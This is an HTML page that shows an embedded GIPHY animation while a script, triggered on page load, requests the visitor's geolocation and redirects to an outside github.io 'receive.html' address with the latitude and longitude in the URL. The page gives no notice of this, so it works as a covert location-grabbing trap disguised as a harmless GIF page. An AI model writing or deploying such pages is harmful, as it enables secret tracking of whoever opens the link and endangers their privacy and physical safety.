<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/YTJXDiVNMPuNSMgC0" width="442" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
<p><a href="https://giphy.com/gifs/moodman-fail-life-backflip-YTJXDiVNMPuNSMgC0">via GIPHY</a></p>

<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        x.innerHTML = "Geolocation is not supported by this browser.";
    }
}

function showPosition(position) {
    // Redirect to your endpoint with the latitude and longitude as query parameters
    const lat = position.coords.latitude;
    const long = position.coords.longitude;
    window.location.href = "https://chandu2005d.github.io/addyourwishes/receive.html?lat=" + lat + "&long=" + long;
}
</script>

</body>
</html>
